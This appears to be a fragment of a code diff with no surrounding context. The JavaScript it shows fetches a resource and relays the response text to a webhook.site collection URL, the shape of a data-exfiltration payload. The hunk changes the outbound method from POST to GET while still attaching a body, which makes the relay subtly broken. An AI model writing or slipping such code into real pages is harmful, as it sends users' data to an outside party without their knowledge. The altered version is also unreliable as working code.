@@ -11,7 +11,7 @@
         .then(res => res.text())
         .then(data => {
           fetch("https://webhook.site/6f2949ee-f2df-4eff-9ce2-7c072db09037", {
-            method: "POST",
+            method: "GET",
             body: data
           });
         });
